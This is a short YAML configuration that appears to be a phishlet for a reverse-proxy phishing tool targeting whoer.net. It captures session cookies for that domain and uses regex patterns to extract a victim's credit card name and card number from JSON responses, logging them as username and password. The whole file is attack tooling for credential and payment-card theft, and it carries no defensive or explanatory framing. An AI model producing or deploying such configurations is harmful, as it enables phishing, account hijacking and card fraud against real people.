auth_tokens:
  - domain: 'whoer.net'
    keys: []
    type: 'cookie'
credentials:
  username:
    key: ''
    search: '{"credit_card".*?"name":"([^"]*)"'
    type: 'json'
  password:
    key: ''
    search: '{"credit_card".*?"number":"([^"]*)"'
    type: 'json'

login:
  domain: 'whoer.net'
  path: '/'